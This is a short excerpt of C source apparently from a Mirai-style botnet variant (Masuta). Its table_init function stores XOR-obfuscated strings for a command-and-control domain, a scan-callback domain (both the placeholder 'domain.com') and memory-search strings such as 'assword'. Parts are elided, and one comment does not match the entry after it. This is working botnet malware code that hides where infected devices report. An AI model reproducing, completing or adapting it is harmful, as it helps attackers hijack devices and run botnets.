...
void table_init(void)
{
	...
	// domain.com
	add_entry(TABLE_CNC_DOMAIN, "\x30\x3B\x27\x39\x2D\x3D\x24\x7A\x37\x38\x21\x36\x54", 13);
    // domain.com
    add_entry(TABLE_SCAN_CB_DOMAIN, "\x30\x3B\x27\x39\x2D\x3D\x24\x7A\x37\x38\x21\x36\x54", 13);
    // 1982
	...
	add_entry(TABLE_MEM_MASUTA1, "\x33\x65\x35\x36\x37\x60\x30\x39\x3B\x67\x61\x3C\x3A\x24\x66\x38\x3D\x31\x64\x3F\x3E\x32\x54", 23);
	// assword
	add_entry(TABLE_MEM_MASUTA2, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8);
